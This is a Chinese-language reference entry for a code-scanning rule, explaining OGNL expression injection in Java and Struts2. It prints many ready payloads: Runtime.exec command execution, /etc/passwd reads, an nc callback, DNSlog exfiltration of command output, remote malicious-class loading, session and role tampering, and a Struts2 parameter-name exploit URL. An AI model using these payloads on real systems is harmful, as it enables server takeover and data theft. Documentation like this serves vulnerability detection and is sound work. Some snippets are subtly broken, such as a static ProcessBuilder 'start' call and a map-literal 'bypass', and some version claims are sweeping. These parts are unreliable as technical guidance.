# OGNL表达式注入漏洞（Java）

> 规则 ID：`other_ognl_codei` · 类别：codei · 关键 sink：getValue
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## OGNL表达式注入漏洞（Java）
OGNL（Object-Graph Navigation Language）是一种基于Java的表达式语言，主要用于访问和操作Java对象的属性、方法，广泛应用于Struts2、XWork等框架中。OGNL表达式注入漏洞，本质是攻击者通过构造恶意OGNL表达式，注入到应用程序的执行流程中，使表达式被解析执行，从而绕过权限控制、执行任意代码、获取敏感信息甚至接管服务器。

#### 一、OGNL核心特性（漏洞基础）
OGNL的核心能力决定了其注入风险的广度：
1. **对象导航**：通过`.`操作符访问对象属性（如`user.name`）、调用方法（如`user.getName()`）；
2. **静态方法调用**：支持通过`@类名@方法名(参数)`调用任意静态方法（如`@java.lang.Runtime@getRuntime().exec("calc")`）；
3. **类实例化**：支持通过`new`关键字创建对象（如`new java.io.File("/etc/passwd")`）；
4. **表达式求值**：支持算术、逻辑、赋值等运算，甚至可以执行复杂的代码逻辑；
5. **上下文绑定**：OGNL依赖`OgnlContext`上下文，可访问上下文内的所有对象（如`#request`、`#session`、`#root`）。

#### 二、漏洞成因
应用程序未对用户输入进行严格校验/转义，直接将用户可控的输入作为OGNL表达式的一部分传入`Ognl.getValue()`/`Ognl.parseExpression()`等解析执行方法，导致攻击者构造的恶意表达式被执行。

核心触发条件：
- 用户输入可嵌入到OGNL表达式中；
- 嵌入后的表达式被OGNL引擎解析并执行；
- 执行上下文拥有足够的权限（如`Runtime`类访问、文件读写权限）。

#### 三、漏洞的典型场景与分类
根据注入位置、触发方式和危害程度，OGNL注入可分为以下几类：

##### 1. 基础表达式注入（直接执行简单命令）
**场景**：用户输入直接拼接进OGNL表达式，无任何过滤。
**示例**：
Struts2框架中，若Action的参数未做过滤，攻击者可通过请求参数注入表达式：
```java
// 应用代码（存在漏洞）
String userInput = request.getParameter("name");
Object result = Ognl.getValue(userInput, context, root); // 直接解析用户输入
```
**攻击Payload**：
```
# 执行系统命令（Windows弹计算器）
@java.lang.Runtime@getRuntime().exec("calc.exe")
# 读取敏感文件
new java.io.BufferedReader(new java.io.FileReader("/etc/passwd")).readLine()
```

##### 2. 上下文对象劫持注入
OGNL上下文（`OgnlContext`）包含大量内置对象（如`#request`、`#session`、`#application`、`#attr`、`#parameters`），攻击者可通过劫持这些对象实现注入：
- **场景1：访问上下文敏感属性**
  攻击者通过`#session.user`读取会话中的用户信息，或通过`#request.getAttribute("token")`窃取令牌；
- **场景2：修改上下文对象**
  构造Payload修改上下文内的权限标识：
  ```
  #session.auth = true  # 篡改会话中的认证状态
  #root.user.role = "admin"  # 修改根对象的用户角色
  ```
- **场景3：利用`#`符号绕过基础过滤**
  部分应用仅过滤了直接的方法调用，但未过滤上下文引用，攻击者可通过`#`拼接表达式：
  ```
  #{'a':'@java.lang.Runtime@getRuntime().exec("whoami")'}
  ```

##### 3. 静态方法/类的深度调用注入
OGNL支持无限制调用Java类的静态方法，攻击者可利用这一特性执行高风险操作：
- **执行系统命令**：
  ```
  // 绕过Runtime单例限制（部分环境Runtime.getRuntime()被禁用）
  @java.lang.ProcessBuilder@start(new java.lang.String[]{"bash","-c","id"})
  ```
- **反射调用敏感方法**：
  若直接调用`Runtime`被拦截，可通过反射绕过：
  ```
  @java.lang.Class@forName("java.lang.Runtime").getMethod("exec",@java.lang.Class@forName("java.lang.String")).invoke(@java.lang.Runtime@getRuntime(),"ls /")
  ```
- **加载恶意类**：
  通过`ClassLoader`加载远程恶意类（需满足类加载条件）：
  ```
  @java.lang.ClassLoader@getSystemClassLoader().loadClass("com.evil.MaliciousClass").newInstance()
  ```

##### 4. 类型转换/自动求值注入
OGNL在解析表达式时会自动进行类型转换和求值，即使输入看似“非表达式”，也可能被解析执行：
- **场景**：应用期望接收字符串参数，但OGNL自动将输入解析为表达式：
  ```java
  // 应用代码：期望接收字符串name，却传入了表达式
  String name = (String) Ognl.getValue("name", context, root);
  ```
- **攻击Payload**：
  构造看似普通字符串的表达式：
  ```
  name='${@java.lang.Runtime@getRuntime().exec("nc ip 4444")}'
  ```
  或利用OGNL的自动求值特性：
  ```
  1+1+@java.lang.Runtime@getRuntime().exec("whoami")
  ```

##### 5. Struts2框架专属OGNL注入（高频场景）
Struts2是OGNL注入的重灾区，其核心组件（如`ActionContext`、`ValueStack`）深度依赖OGNL，常见触发点包括：
- **参数名注入**：Struts2会解析参数名作为OGNL表达式（如S2-001、S2-007）：
  请求：`http://xxx/action?(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+@java.lang.Runtime@getRuntime().exec(%22calc%22))=1`
- **表单字段/动态方法调用注入**：Struts2的动态方法调用（DMI）特性，若未禁用，攻击者可通过`action!method`注入表达式；
- **文件上传/拦截器注入**：Struts2的文件上传拦截器、参数拦截器未过滤用户输入，导致表达式注入；
- **OGNL表达式在配置文件中硬编码**：若Struts2配置文件（`struts.xml`）中使用`${}`嵌入用户可控内容，会触发注入。

##### 6. 盲注/无回显OGNL注入
若应用无直接输出，攻击者可通过盲注方式利用漏洞：
- **时间盲注**：通过执行耗时命令判断注入是否成功：
  ```
  @java.lang.Thread@sleep(5000)  # 若请求延迟5秒，说明表达式执行成功
  ```
- **DNSlog外带数据**：通过DNS解析泄露敏感信息：
  ```
  @java.net.InetAddress@getByName(@java.lang.Runtime@getRuntime().exec("hostname").getInputStream().toString()+".dnslog.cn")
  ```

#### 四、漏洞危害层级
1. **信息泄露**：读取服务器敏感文件（`/etc/passwd`、`web.xml`）、获取会话信息、数据库凭证；
2. **权限提升**：篡改上下文对象，提升用户权限至管理员；
3. **远程代码执行（RCE）**：执行任意系统命令，控制服务器；
4. **服务器接管**：通过RCE写入后门、创建管理员账户、横向渗透；
5. **数据篡改/破坏**：删除文件、修改数据库数据、破坏应用逻辑。

#### 五、影响范围
- **框架**：Struts2（全版本高危）、XWork、ONGL核心库（ognl-2.6.11及以下存在原生漏洞）；
- **应用**：所有直接使用OGNL解析用户输入的Java应用（如自定义MVC框架、企业级应用）；
- **JDK版本**：JDK 6/7/8均受影响（JDK 9+对`Runtime`/`ProcessBuilder`有部分限制，但仍可绕过）。

#### 六、关键触发点总结
OGNL注入的核心触发点是“用户输入进入OGNL解析流程”，常见位置包括：
1. 请求参数（QueryString、Form Data、JSON/XML参数）；
2. Cookie/Header（如User-Agent、Referer）；
3. 文件上传的文件名/内容；
4. 动态生成的OGNL表达式（如模板引擎拼接用户输入）；
5. Struts2的Action参数、ValueStack操作。

以上是OGNL表达式注入漏洞的完整描述，涵盖了成因、核心特性、各类场景、危害及触发条件。


